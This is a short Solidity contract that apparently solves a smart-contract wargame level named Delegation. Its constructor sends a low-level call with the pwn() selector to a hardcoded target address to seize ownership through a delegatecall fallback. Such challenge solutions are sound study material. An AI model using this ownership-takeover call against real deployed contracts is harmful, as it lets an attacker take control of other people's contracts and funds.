pragma solidity ^0.8.9;

interface IDelegation {
  fallback() external;
}

contract Delegation {
  address targetAddress = 0x60eC92db92321E2cE3dbF8c018f01266C6706A31;
  IDelegation targetContract;

  constructor () {
    targetContract = IDelegation(targetAddress);
    address(targetContract).call(abi.encodeWithSignature("pwn()"));
  }
}
